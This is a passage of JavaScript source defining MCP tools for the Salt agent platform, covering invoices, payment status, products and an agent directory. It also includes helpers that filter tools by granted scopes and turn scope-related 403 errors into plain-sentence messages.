            },
            required: ["name", "qty", "unit_price"],
          },
        },
        due_date: { type: "string" },
      },
      required: ["chat_id", "to", "chain", "line_items"],
    },
    outputSchema: {
      type: "object",
      properties: { request_id: { type: "string" }, amount: { type: "string" }, status: { type: "string" } },
      required: ["request_id", "amount"],
    },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
    execute: sendInvoice,
  },
  {
    name: "get_payment_status",
    title: "Get Payment Status",
    description: "Reads the current status of a payment request or invoice this connection sent.",
    scope: SCOPES.MONEY,
    inputSchema: { type: "object", properties: { request_id: { type: "string" } }, required: ["request_id"] },
    outputSchema: {
      type: "object",
      properties: {
        id: { type: "string" },
        status: { type: "string" },
        amount: { type: "string" },
        request_type: { type: "string" },
        last_failed_reason: { type: ["string", "null"] },
      },
      required: ["id", "status"],
    },
    annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: getPaymentStatus,
  },
  {
    name: "list_products",
    title: "List Products",
    description: "Lists this connection's own products, or a seller's active products.",
    scope: SCOPES.MONEY,
    inputSchema: { type: "object", properties: { seller_id: { type: "string" } } },
    outputSchema: { type: "object", properties: { products: { type: "array", items: { type: "object" } } }, required: ["products"] },
    annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: listProductsTool,
  },
  {
    name: "create_product",
    title: "Create Product",
    description:
      "Adds a real, billable product to this connection's shop, pinned to a wallet the human attached to this " +
      `connection's grant for the given chain. ${MONEY_HINT}`,
    scope: SCOPES.MONEY,
    inputSchema: {
      type: "object",
      properties: {
        title: { type: "string" },
        kind: { type: "string", enum: ["one_time", "metered", "subscription"] },
        price: { type: "string" },
        chain: { type: "string", description: "The chain this product is priced/paid in -- must match a wallet granted to this connection." },
        testnet: { type: "boolean", description: "True for the testnet wallet on that chain. Defaults to false (mainnet)." },
        description: { type: "string" },
      },
      required: ["title", "kind", "price", "chain"],
    },
    outputSchema: { type: "object", properties: { created: { type: "boolean" }, product: { type: "object" } }, required: ["created"] },
    annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true },
    execute: createProductTool,
  },
  {
    name: "list_salt_agents",
    title: "List Salt Agents",
    description: "Browses the public Salt agent directory.",
    scope: SCOPES.CHAT,
    inputSchema: { type: "object", properties: {} },
    outputSchema: { type: "object", properties: { agents: { type: "array", items: { type: "object" } } }, required: ["agents"] },
    annotations: { readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true },
    execute: (rest, bearerToken) => listSaltAgents(rest, bearerToken),
  },
];

export const KEYLESS_TOOL_NAMES = new Set(KEYLESS_TOOLS.map((t) => t.name));

/** Maps a keyless tool's definition to an MCP Tool object, including the MCP Apps `_meta.ui.resourceUri` link where declared. */
export function toKeylessMcpTools(tools = KEYLESS_TOOLS) {
  return tools.map((tool) => {
    const mcpTool = {
      name: tool.name,
      title: tool.title,
      description: tool.description,
      inputSchema: tool.inputSchema,
      annotations: { title: tool.title, ...tool.annotations },
    };
    if (tool.outputSchema) mcpTool.outputSchema = tool.outputSchema;
    if (tool.ui?.resourceUri) mcpTool._meta = { ui: { resourceUri: tool.ui.resourceUri } };
    return mcpTool;
  });
}

/**
 * The keyless tools a token's granted scopes can actually use: a chat-only
 * connection is not shown the payment, invoice and product tools, which would
 * only fail when called. Listing is a courtesy, not the gate -- calling a
 * hidden tool anyway still reaches salt-api and gets its scope refusal.
 */
export function keylessToolsForScopes(scopes, tools = KEYLESS_TOOLS) {
  const granted = Array.isArray(scopes) ? scopes : [];
  return tools.filter((tool) => !tool.scope || granted.includes(tool.scope));
}

/**
 * Runs one keyless tool by name. Rewrites a salt-api 403 into a plain
 * sentence naming the missing scope (per the K5 contract: "When salt-api
 * answers 403 for a missing scope, return a plain-sentence tool error").
 * Any other error's message is passed through as-is -- SaltBearerApiError
 * already carries salt-api's own one-sentence `error` body.
 *
 * `signal` (AbortSignal) and `grant` ({scopes, wallets}, from the SAME
 * token-validation call src/http.mjs already made for this request -- see
 * createTokenValidator) are threaded through to whichever tool's
 * `execute` actually wants them (ask_human/get_ask_result for the
 * signal; request_payment/send_invoice/create_product for the grant's
 * wallets). Every other tool ignores its 4th argument.
 *
 * `maxTotalMsOverride`/`minEmptyPollMsOverride` are ONLY for tests calling
 * this function directly -- src/http.mjs (the one real caller reachable
 * from the wire) never passes either, so no MCP client can ever set
 * ask_human's/get_ask_result's polling budget or pacing floor. Fixing
 * this at exactly this boundary (an options object only server-side code
 * populates) rather than reading it off `args` is the point: see
 * keyless-tools.mjs's `_maxTotalMs` history in git log for the bug this
 * replaced.
 */
export async function runKeylessTool(name, args, { rest, bearerToken, signal, grant, maxTotalMsOverride, minEmptyPollMsOverride }) {
  const tool = KEYLESS_TOOLS.find((t) => t.name === name);
  if (!tool) throw new Error(`Tool "${name}" is not available on this connection.`);
  try {
    return await tool.execute(rest, bearerToken, args ?? {}, { signal, grant, maxTotalMsOverride, minEmptyPollMsOverride });
  } catch (err) {
    if (err instanceof SaltBearerApiError && err.status === 403) {
      throw new Error(SCOPE_REFUSAL_MESSAGE[tool.scope] || SCOPE_REFUSAL_MESSAGE[SCOPES.CHAT]);
    }
    throw err;
  }
}

/** For the MCP Apps resource wiring in src/http.mjs. */
export { CARD_UI_RESOURCE_URI };
